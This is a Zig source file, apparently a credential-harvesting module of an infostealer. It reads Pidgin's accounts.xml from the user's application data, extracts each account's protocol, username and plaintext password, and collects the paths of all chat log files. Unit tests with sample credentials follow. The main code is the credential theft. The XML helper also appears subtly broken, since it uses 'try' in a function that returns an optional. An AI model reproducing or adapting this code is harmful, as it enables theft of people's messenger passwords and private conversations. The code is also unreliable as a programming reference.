const std = @import("std");
const file_io = @import("../parsers/file_io.zig");

const ACCOUNTS_FILE = "accounts.xml";
const LOGS_DIR = "logs";

pub const MessengerResult = struct {
    accounts: [][]const u8,
    log_files: [][]const u8,
};

fn parseAccounts(allocator: std.mem.Allocator, data: []const u8) ![][]const u8 {
    var list = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (list.items) |item| allocator.free(item);
        list.deinit();
    }

    var search_pos: usize = 0;
    while (std.mem.indexOfPos(u8, data, search_pos, "<account>")) |acc_start| {
        const acc_end = std.mem.indexOfPos(u8, data, acc_start, "</account>") orelse break;
        search_pos = acc_end + 10;
        const block = data[acc_start .. acc_end + 10];

        const protocol = extractXmlField(block, "protocol") orelse "unknown";
        const username = extractXmlField(block, "name") orelse "unknown";
        const password = extractXmlField(block, "password") orelse "unknown";

        const line = try std.fmt.allocPrint(allocator, "{s}\t{s}\t{s}\n", .{ protocol, username, password });
        try list.append(line);
    }

    return list.toOwnedSlice();
}

fn extractXmlField(data: []const u8, field: []const u8) ?[]const u8 {
    const open_tag = try std.fmt.allocPrint(std.heap.page_allocator, "<{s}>", .{field});
    defer std.heap.page_allocator.free(open_tag);
    const close_tag = try std.fmt.allocPrint(std.heap.page_allocator, "</{s}>", .{field});
    defer std.heap.page_allocator.free(close_tag);

    const start = std.mem.indexOf(u8, data, open_tag) orelse return null;
    const value_start = start + open_tag.len;
    const end = std.mem.indexOf(u8, data, close_tag) orelse return null;
    if (end <= value_start) return null;
    return data[value_start..end];
}

fn collectLogFiles(allocator: std.mem.Allocator, base_path: []const u8) ![][]const u8 {
    const logs_path = try std.fs.path.join(allocator, &[_][]const u8{ base_path, LOGS_DIR });
    defer allocator.free(logs_path);

    var dir = std.fs.openDirAbsolute(logs_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
    defer dir.close();

    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ logs_path, entry.name });
        try files.append(full);
    }

    return files.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, app_data: []const u8) !MessengerResult {
    const accounts_path = try std.fs.path.join(allocator, &[_][]const u8{ app_data, ACCOUNTS_FILE });
    defer allocator.free(accounts_path);

    const mapped = file_io.MappedFile.open(accounts_path) orelse {
        return MessengerResult{
            .accounts = try allocator.alloc([]const u8, 0),
            .log_files = try allocator.alloc([]const u8, 0),
        };
    };
    defer mapped.close();

    const accounts = parseAccounts(allocator, mapped.slice()) catch try allocator.alloc([]const u8, 0);
    errdefer {
        for (accounts) |a| allocator.free(a);
        allocator.free(accounts);
    }

    const log_files = collectLogFiles(allocator, app_data) catch try allocator.alloc([]const u8, 0);

    return MessengerResult{
        .accounts = accounts,
        .log_files = log_files,
    };
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__pidgin");
    defer {
        for (result.accounts) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(result.accounts);
        for (result.log_files) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result.log_files);
    }
    try std.testing.expectEqual(@as(usize, 0), result.accounts.len);
    try std.testing.expectEqual(@as(usize, 0), result.log_files.len);
}

test "parseAccounts extracts from valid XML" {
    const xml =
        \\<?xml version="1.0"?>
        \\<accounts>
        \\<account>
        \\<protocol>prpl-oscar</protocol>
        \\<name>alice</name>
        \\<password>secret123</password>
        \\</account>
        \\<account>
        \\<protocol>prpl-irc</protocol>
        \\<name>bob</name>
        \\<password>pass456</password>
        \\</account>
        \\</accounts>
    ;
    const result = try parseAccounts(std.testing.allocator, xml);
    defer {
        for (result) |r| std.testing.allocator.free(r);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 2), result.len);
    try std.testing.expect(std.mem.indexOf(u8, result[0], "prpl-oscar") != null);
    try std.testing.expect(std.mem.indexOf(u8, result[0], "alice") != null);
    try std.testing.expect(std.mem.indexOf(u8, result[0], "secret123") != null);
    try std.testing.expect(std.mem.indexOf(u8, result[1], "prpl-irc") != null);
    try std.testing.expect(std.mem.indexOf(u8, result[1], "bob") != null);
    try std.testing.expect(std.mem.indexOf(u8, result[1], "pass456") != null);
}

test "parseAccounts returns empty for no accounts" {
    const result = try parseAccounts(std.testing.allocator, "<accounts></accounts>");
    defer {
        for (result) |r| std.testing.allocator.free(r);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "extractXmlField extracts value correctly" {
    const block = "<account><protocol>prpl-oscar</protocol><name>user</name></account>";
    const protocol = extractXmlField(block, "protocol");
    try std.testing.expect(protocol != null);
    try std.testing.expectEqualSlices(u8, "prpl-oscar", protocol.?);
    const name = extractXmlField(block, "name");
    try std.testing.expect(name != null);
    try std.testing.expectEqualSlices(u8, "user", name.?);
}

test "extractXmlField returns null for missing field" {
    const block = "<account><name>user</name></account>";
    try std.testing.expect(extractXmlField(block, "protocol") == null);
}
